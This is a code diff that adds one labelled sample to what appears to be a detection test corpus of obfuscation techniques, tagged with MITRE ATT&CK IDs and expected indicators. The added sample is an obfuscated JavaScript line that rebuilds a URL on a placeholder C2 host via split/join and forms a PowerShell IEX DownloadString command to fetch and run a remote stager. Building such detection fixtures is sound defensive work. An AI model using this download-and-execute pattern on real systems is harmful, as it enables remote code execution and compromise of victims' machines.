@@ -512,6 +512,19 @@ TECHNIQUES: list[dict] = [
                 ["T1027", "T1140", "T1059.007", "T1105"],
                 ["javascript_to_powershell_handoff", "download_and_execute", "obfuscated_command_line"],
             ),
+            _sample(
+                # SocGholish + GootLoader observed pattern: URL delimiters
+                # replaced with a sentinel character, later restored by
+                # `.split('X').join('/')`. Real-world observed technique.
+                "GL026", "split_join_replace_url_delimiter",
+                "var url = 'http:XXc2.gl-splitjoin.example.com/stager/load.ps1'.split('XX').join('//'); var cmd = 'IEX ((New-Object Net.WebClient).DownloadString(\"' + url + '\"))';",
+                "javascript", "javascript",
+                ["js-split-join"],
+                ["http://c2.gl-splitjoin.example.com/stager/load.ps1"],
+                ["http://c2.gl-splitjoin.example.com/stager/load.ps1"],
+                ["T1027", "T1140", "T1059.007", "T1105"],
+                ["javascript_to_powershell_handoff", "download_and_execute", "obfuscated_command_line"],
+            ),
         ],
     },
 ]
